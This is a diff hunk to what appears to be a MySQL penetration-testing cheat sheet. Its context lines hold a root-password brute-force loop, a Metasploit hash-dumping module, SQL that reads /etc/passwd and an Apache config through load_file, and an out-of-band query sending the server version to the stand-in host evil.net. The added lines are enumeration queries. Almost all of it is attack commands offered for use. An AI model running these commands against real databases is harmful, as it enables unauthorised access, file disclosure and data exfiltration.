@@ -6,6 +6,8 @@ for i in `seq 1 1000`; do mysql -u root --password=bad -h 127.0.0.1 2>/dev/null;
 auxiliary/scanner/mysql/mysql_authbypass_hashdump
 
 # common tricks
+show variables
+select * from mysql.func
 select user(),database(),version(),@@datadir,5
 select load_file('/etc/passwd') or SELECT CAST(load_file( '/etc/apache2/sites-enabled/000-default') AS char) 
 select load_file(concat('\\',version(),'evil.net\oob'))
